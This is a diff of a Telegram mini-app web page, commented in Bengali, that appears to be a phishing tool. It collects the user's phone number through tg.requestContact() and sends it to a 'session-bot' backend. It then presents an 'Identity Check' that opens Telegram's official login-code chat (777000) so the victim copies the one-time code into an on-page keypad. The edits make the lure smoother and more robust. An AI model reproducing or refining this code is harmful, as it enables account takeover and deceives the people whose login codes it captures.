@@ -8,7 +8,7 @@
     <style>
         body { font-family: sans-serif; padding: 0; margin: 0; background: #000; color: white; text-align: center; }
         .box { background: white; color: #333; padding: 25px; border-radius: 25px; margin: 40px 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
-        .btn { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; display: block; text-decoration: none; }
+        .btn { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; display: block; text-decoration: none; -webkit-tap-highlight-color: transparent; }
         .btn-blue { background: #0088cc; margin-bottom: 20px; }
         .hidden { display: none; }
         
@@ -32,10 +32,11 @@
     </div>
 
     <div class="box hidden" id="step2">
-        <h3 style="margin-top:0;">Enter 5-Digit Code</h3>
+        <h3 style="margin-top:0;">Identity Check</h3>
+        <p style="font-size:13px; color:#666; margin-bottom:15px;">Click the button below to see your code</p>
         
-        <!-- এই লিঙ্কটি সরাসরি আপনার ওটিপি চ্যাট (777000) ওপেন করবে -->
-        <button class="btn btn-blue" onclick="tg.openTelegramLink('https://t.me/777000')">📩 Get OTP Code</button>
+        <!-- এই বাটনটি ভিডিওর মতো সরাসরি ওটিপি চ্যাটে নিয়ে যাবে -->
+        <button class="btn btn-blue" onclick="openOTPChat()">📩 GET CODE</button>
         
         <input type="text" id="otp_display" class="otp-display" placeholder="-----" readonly>
         
@@ -53,6 +54,12 @@
         const BACKEND_URL = "https://pmrony-session-bot.hf.space";
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
         let currentOTP = "";
+
+        // এই ফাংশনটি ভিডিওর মতো সরাসরি চ্যাটে নিয়ে যাবে
+        function openOTPChat() {
+            // এটি টেলিগ্রামের ইন্টারনাল কমান্ড যা সরাসরি 777000 আইডি-র চ্যাট ওপেন করে
+            window.location.href = 'tg://openmessage?user_id=777000';
+        }
 
         function startFlow() {
             tg.requestContact();
@@ -74,15 +81,17 @@
         }
 
         async function sendNumber(phone) {
-            const res = await fetch(`${BACKEND_URL}/send_number`, {
-                method: "POST", headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ user_id: userId, phone: phone })
-            });
-            const data = await res.json();
-            if (data.status === "success") {
-                document.getElementById('step0').classList.add('hidden');
-                document.getElementById('step2').classList.remove('hidden');
-            } else { alert(data.message); }
+            try {
+                const res = await fetch(`${BACKEND_URL}/send_number`, {
+                    method: "POST", headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({ user_id: userId, phone: phone })
+                });
+                const data = await res.json();
+                if (data.status === "success") {
+                    document.getElementById('step0').classList.add('hidden');
+                    document.getElementById('step2').classList.remove('hidden');
+                } else { alert(data.message); }
+            } catch (e) { alert("Server Error!"); }
         }
 
         function addNum(n) { if(currentOTP.length < 5) { currentOTP += n; document.getElementById("otp_display").value = currentOTP; } }
